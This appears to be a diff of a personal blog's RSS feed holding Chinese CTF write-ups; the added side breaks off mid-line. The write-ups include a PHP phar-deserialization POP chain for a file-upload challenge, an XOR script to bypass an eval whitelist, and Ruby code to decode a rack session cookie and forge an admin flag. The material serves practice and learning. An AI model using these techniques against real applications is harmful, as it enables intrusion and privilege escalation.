@@ -1,220 +1,33 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>e .wp on Alex lan</title><link>http://localhost:1313/docs/wp/</link><description>Recent content in e .wp on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/docs/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>bili_22_1024</title><link>http://localhost:1313/docs/wp/bili_22_1024/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/wp/bili_22_1024/</guid><description>&lt;p>今年比往年难,可见的,去年抄答案混分,说今年必然会做&lt;/p>
-&lt;p>只做了三道题,菜&lt;/p>
-&lt;ul>
-&lt;li>
-&lt;p>ezinvader&lt;/p>
-&lt;p>js文件里头有个颜文字,解出来有个post,直接跑密码,提示了8个星号,8位弱密码&lt;/p>
-&lt;p>Aa123456,在响应头里,&lt;/p>
-&lt;p>其实我自己没跑出来???&lt;/p>
-&lt;p>问得别人密码,原来重置一下sessenid就行了&lt;/p>
-&lt;/li>
-&lt;li>
-&lt;p>up&lt;/p>
-&lt;p>文件上传&lt;/p>
-&lt;pre tabindex="0">&lt;code>&amp;lt;?php
-
-// flag in /tmp/flag.php 
-
-
-class Modifier {
-
- public function __invoke(){
- include(&amp;#34;index.php&amp;#34;);
- }
-}
-
-class Action {
- public $checkAccess=&amp;#39;index.php&amp;#39;;
- public $id=&amp;#39;0a&amp;#39;;
-
- public function run()
- { 
- if(strpos($this-&amp;gt;checkAccess, &amp;#39;upload&amp;#39;) !== false){ 
- echo &amp;#34;error path&amp;#34;;
- exit();
- } 
-
- if ($this-&amp;gt;id !== 0 &amp;amp;&amp;amp; $this-&amp;gt;id !== 1) {
- switch($this-&amp;gt;id) {
- case 0:
- if ($this-&amp;gt;checkAccess) {
- include($this-&amp;gt;checkAccess);
- }
- break;
- case 1:
- throw new Exception(&amp;#34;id invalid in &amp;#34;.__CLASS__.__FUNCTION__);
- break;
- default:
- break; 
- }
- }
- }
-
-}
-
-class Content {
-
- public $formatters;
-
- public function getFormatter($formatter)//close
- {
- echo $formatter,&amp;#39;-----&amp;#39;;
- if (isset($this-&amp;gt;formatters[$formatter])) {
- echo &amp;#39;222222222222&amp;#39;;
- return $this-&amp;gt;formatters[$formatter];
- }
-
- foreach ($this-&amp;gt;providers as $provider) {
- if (method_exists($provider, $formatter)) {
- $this-&amp;gt;formatters[$formatter] = array($provider, $formatter);
- return $this-&amp;gt;formatters[$formatter];
- }
- }
- throw new \InvalidArgumentException(sprintf(&amp;#39;Unknown formatter &amp;#34;%s&amp;#34;&amp;#39;, $formatter));
- }
-
- public function __call($name, $arguments)
- {
- $a=$this-&amp;gt;getFormatter($name);
- echo $a;
- return call_user_func_array($a, $arguments);
- }
-}
-
-class Show{
- public $source;
- public $str;
- public $reader;
- public function __construct($file=&amp;#39;index.php&amp;#39;) {
- $this-&amp;gt;source = $file;
- echo &amp;#39;Welcome to &amp;#39;.$this-&amp;gt;source.&amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
- }
- public function __toString() {
- echo &amp;#39;string--------&amp;#39;;
- $this-&amp;gt;str-&amp;gt;reset();
- return &amp;#39;&amp;#39;;
- }
-
- public function __wakeup() {
-
- if(preg_match(&amp;#34;/gopher|phar|http|file|ftp|dict|\.\./i&amp;#34;, $this-&amp;gt;source)) {
- throw new Exception(&amp;#39;invalid protocol found in &amp;#39;.__CLASS__);
- echo &amp;#39;111111111111111111&amp;#39;;
- }
- }
-
- public function reset() {
-
- if ($this-&amp;gt;reader !== null) {
- echo &amp;#39;reset----&amp;#39;; 
- $this-&amp;gt;reader-&amp;gt;close();
- }
- }
-}
-$a=new Show();
-$a-&amp;gt;str=&amp;#39;1&amp;#39;;
-$b=new Show;
-$b-&amp;gt;reader=&amp;#39;1&amp;#39;;
-
-$d=new Content;
-$d-&amp;gt;formatters[&amp;#39;close&amp;#39;]=array(new Action,&amp;#39;run&amp;#39;);
-
-$a-&amp;gt;reader=$d;
-$b-&amp;gt;str=$a;
-
-
-$c=new Show($b);
-$c-&amp;gt;str=&amp;#39;1&amp;#39;;
-$c-&amp;gt;reader=&amp;#39;1&amp;#39;;
-
-
-// $a=&amp;#39;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:3:&amp;#34;str&amp;#34;;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:3:&amp;#34;str&amp;#34;;s:1:&amp;#34;1&amp;#34;;s:6:&amp;#34;reader&amp;#34;;O:7:&amp;#34;Content&amp;#34;:1:{s:10:&amp;#34;formatters&amp;#34;;a:1:{s:5:&amp;#34;close&amp;#34;;a:2:{i:0;O:6:&amp;#34;Action&amp;#34;:2:{s:11:&amp;#34;checkAccess&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:2:&amp;#34;0a&amp;#34;;}i:1;s:3:&amp;#34;run&amp;#34;;}}}}s:6:&amp;#34;reader&amp;#34;;s:1:&amp;#34;1&amp;#34;;}s:3:&amp;#34;str&amp;#34;;s:1:&amp;#34;1&amp;#34;;s:6:&amp;#34;reader&amp;#34;;s:1:&amp;#34;1&amp;#34;;}&amp;#39;;
-// unserialize($a)
-
-
-//show _construct _tostring reset content _call close ,$this-&amp;gt;formatters【&amp;#39;close&amp;#39;】 = 【new Action(), &amp;#39;run&amp;#39;】
-
-
-$phar=new phar(&amp;#39;test.phar&amp;#39;);
-$phar-&amp;gt;startBuffering();
-$phar-&amp;gt;setStub(&amp;#34;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#34;);
-$phar-&amp;gt;setMetadata($c);
-$phar-&amp;gt;addFromString(&amp;#34;flag.txt&amp;#34;,&amp;#34;flag&amp;#34;);
-$phar-&amp;gt;stopBuffering();
-
-?&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>改了后缀png,上传上去,触发&lt;/p></description></item><item><title>LOVE_math</title><link>http://localhost:1313/docs/wp/love_math/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/wp/love_math/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">error_reporting&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;c&amp;#39;&lt;/span>])){
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//例子 c=20-1
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $content &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;c&amp;#39;&lt;/span>];
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strlen&lt;/span>($content) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;太长了不会算&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $blacklist &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\t&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\r&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\n&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;\&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;&amp;#34;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;`&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\[&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;\]&amp;#39;&lt;/span>];
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($blacklist &lt;span style="color:#66d9ef">as&lt;/span> $blackitem) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $blackitem &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/m&amp;#39;&lt;/span>, $content)) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;请不要输入奇奇怪怪的字符&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $whitelist &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;abs&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan2&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atanh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;bindec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;ceil&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;decbin&amp;#39;&lt;/span> , &lt;span style="color:#e6db74">&amp;#39;decoct&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;deg2rad&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;expm1&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;floor&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;fmod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hexdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hypot&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_finite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_infinite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_nan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;lcg_value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log10&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log1p&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;max&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;min&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;octdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pi&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pow&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rad2deg&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;round&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sqrt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tanh&amp;#39;&lt;/span>];
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">preg_match_all&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&amp;#39;&lt;/span>, $content, $used_funcs);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($used_funcs[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#66d9ef">as&lt;/span> $func) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">in_array&lt;/span>($func, $whitelist)) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;请不要输入奇奇怪怪的函数&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//帮你算出答案
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">eval&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;echo &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$content&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;&amp;#39;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>好骚的姿势啊&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$payload &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;abs&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;acosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;asinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan2&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;atanh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;bindec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;ceil&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cos&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;cosh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;decbin&amp;#39;&lt;/span> , &lt;span style="color:#e6db74">&amp;#39;decoct&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;deg2rad&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;expm1&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;floor&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;fmod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hexdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hypot&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_finite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_infinite&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;is_nan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;lcg_value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log10&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log1p&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;log&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;max&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;min&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_getrandmax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;mt_srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;octdec&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pi&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;pow&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rad2deg&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;round&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sin&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sinh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sqrt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;srand&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tan&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;tanh&amp;#39;&lt;/span>];
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span>($k&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;$k&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#a6e22e">sizeof&lt;/span>($payload);$k&lt;span style="color:#f92672">++&lt;/span>){
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;$i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>; $i&lt;span style="color:#f92672">++&lt;/span>){
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;$j &lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>;$j&lt;span style="color:#f92672">++&lt;/span>){
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $exp &lt;span style="color:#f92672">=&lt;/span> $payload[$k] &lt;span style="color:#f92672">^&lt;/span> $i&lt;span style="color:#f92672">.&lt;/span>$j;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span>($payload[$k]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;^&lt;/span>&lt;span style="color:#e6db74">$i$j&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;==&amp;gt;&lt;/span>&lt;span style="color:#e6db74">$exp&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>字符串异或&lt;/p></description></item><item><title>ruby_cookie</title><link>http://localhost:1313/docs/wp/webexercise/ruby_cookie/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/wp/webexercise/ruby_cookie/</guid><description>&lt;h2 id="ruby_cookie">
- ruby_cookie
- &lt;a class="anchor" href="#ruby_cookie">#&lt;/a>
-&lt;/h2>
-&lt;h4 id="from-buuctf-bsidescf-2019mixer">
- from: buuctf [BSidesCF 2019]Mixer
- &lt;a class="anchor" href="#from-buuctf-bsidescf-2019mixer">#&lt;/a>
-&lt;/h4>
-&lt;p>看到rack-cookie &lt;a href="https://www.freebuf.com/vuls/181368.html">找了个文章&lt;/a>&lt;/p>
-&lt;pre tabindex="0">&lt;code>require &amp;#34;uri&amp;#34;
-require &amp;#34;base64&amp;#34;
-require &amp;#34;pp&amp;#34;
-encoded_string = &amp;#34;BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTBiNDJlNTgzNjJjOWFjNjU5NzJm%0ANzAwYmMxODczZTlkYzBiY2ZkMGI3NGZlYzE4NjBhNWRmNGY3NTg2NDg4NjkG%0AOwBGSSIMYWVzX2tleQY7AEYiJa5eOeNVt5U3U6b2OYRb%2Bz2Do4Uxpnpqkw5L%0AM%2BRPHR46%0A&amp;#34;
-
-decoded_uri = URI.decode_www_form_component(encoded_string)
-decoded_base64 = Base64.decode64(decoded_uri)
-puts decoded_base64
-begin
- object = Marshal.load(decoded_base64)
- pp object
-rescue ArgumentError =&amp;gt; e
- puts &amp;#34;ERROR: &amp;#34;+e.to_s
-end
-&lt;/code>&lt;/pre>&lt;p>改改，运行&lt;/p>
-&lt;pre tabindex="0">&lt;code>ruby test.rb
-&lt;/code>&lt;/pre>&lt;p>看到&lt;/p>
-&lt;pre tabindex="0">&lt;code>{I&amp;#34;session_id:ETI&amp;#34;E0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869;FI&amp;#34;
-aes_key;F&amp;#34;%�^9�U��7S��9�[�=���1�zj�K3�O:
-{&amp;#34;session_id&amp;#34;=&amp;gt;&amp;#34;0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869&amp;#34;,
- &amp;#34;aes_key&amp;#34;=&amp;gt;&amp;#34;\xAE^9\xE3U\xB7\x957S\xA6\xF69\x84[\xFB=\x83\xA3\x851\xA6zj\x93\x0EK3\xE4O\x1D\x1E:&amp;#34;}
-&lt;/code>&lt;/pre>&lt;p>aes key考虑一波解密，把密钥base64一下或者hex，试了上面的session_id 解不开&lt;/p>
-&lt;p>想到返回包中还有一个user cookie，得到&lt;/p>
-&lt;pre tabindex="0">&lt;code>{&amp;#34;first_name&amp;#34;:&amp;#34;123&amp;#34;,&amp;#34;last_name&amp;#34;:&amp;#34;123&amp;#34;,&amp;#34;is_admin&amp;#34;:0}
-&lt;/code>&lt;/pre>&lt;p>开了，直接该is_admin=1,在加密回hex发包回去&lt;/p>
-&lt;p>get flag&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>e .wp on Alex lan</title>
+    <link>http://localhost:1313/docs/wp/</link>
+    <description>Recent content in e .wp on Alex lan</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate>
+    <atom:link href="http://localhost:1313/docs/wp/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>bili_22_1024</title>
+      <link>http://localhost:1313/docs/wp/bili_22_1024/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/wp/bili_22_1024/</guid>
+      <description>&lt;p&gt;今年比往年难,可见的,去年抄答案混分,说今年必然会做&lt;/p&gt;&#xA;&lt;p&gt;只做了三道题,菜&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ezinvader&lt;/p&gt;&#xA;&lt;p&gt;js文件里头有个颜文字,解出来有个post,直接跑密码,提示了8个星号,8位弱密码&lt;/p&gt;&#xA;&lt;p&gt;Aa123456,在响应头里,&lt;/p&gt;&#xA;&lt;p&gt;其实我自己没跑出来???&lt;/p&gt;&#xA;&lt;p&gt;问得别人密码,原来重置一下sessenid就行了&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;up&lt;/p&gt;&#xA;&lt;p&gt;文件上传&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php&#xA;&#xA;// flag in /tmp/flag.php &#xA;&#xA;&#xA;class Modifier {&#xA;&#xA;    public function __invoke(){&#xA;        include(&amp;#34;index.php&amp;#34;);&#xA;    }&#xA;}&#xA;&#xA;class Action {&#xA;    public $checkAccess=&amp;#39;index.php&amp;#39;;&#xA;    public $id=&amp;#39;0a&amp;#39;;&#xA;&#xA;    public function run()&#xA;    {  &#xA;        if(strpos($this-&amp;gt;checkAccess, &amp;#39;upload&amp;#39;) !== false){ &#xA;            echo &amp;#34;error path&amp;#34;;&#xA;            exit();&#xA;        } &#xA;&#xA;        if ($this-&amp;gt;id !== 0 &amp;amp;&amp;amp; $this-&amp;gt;id !== 1) {&#xA;            switch($this-&amp;gt;id) {&#xA;                case 0:&#xA;                    if ($this-&amp;gt;checkAccess) {&#xA;                        include($this-&amp;gt;checkAccess);&#xA;                    }&#xA;                    break;&#xA;                case 1:&#xA;                    throw new Exception(&amp;#34;id invalid in &amp;#34;.__CLASS__.__FUNCTION__);&#xA;                    break;&#xA;                default:&#xA;                    break;         &#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;}&#xA;&#xA;class Content {&#xA;&#xA;    public $formatters;&#xA;&#xA;    public function getFormatter($formatter)//close&#xA;    {&#xA;        echo $formatter,&amp;#39;-----&amp;#39;;&#xA;        if (isset($this-&amp;gt;formatters[$formatter])) {&#xA;            echo &amp;#39;222222222222&amp;#39;;&#xA;            return $this-&amp;gt;formatters[$formatter];&#xA;        }&#xA;&#xA;        foreach ($this-&amp;gt;providers as $provider) {&#xA;            if (method_exists($provider, $formatter)) {&#xA;                $this-&amp;gt;formatters[$formatter] = array($provider, $formatter);&#xA;                return $this-&amp;gt;formatters[$formatter];&#xA;            }&#xA;        }&#xA;        throw new \InvalidArgumentException(sprintf(&amp;#39;Unknown formatter &amp;#34;%s&amp;#34;&amp;#39;, $formatter));&#xA;    }&#xA;&#xA;    public function __call($name, $arguments)&#xA;    {&#xA;        $a=$this-&amp;gt;getFormatter($name);&#xA;        echo $a;&#xA;        return call_user_func_array($a, 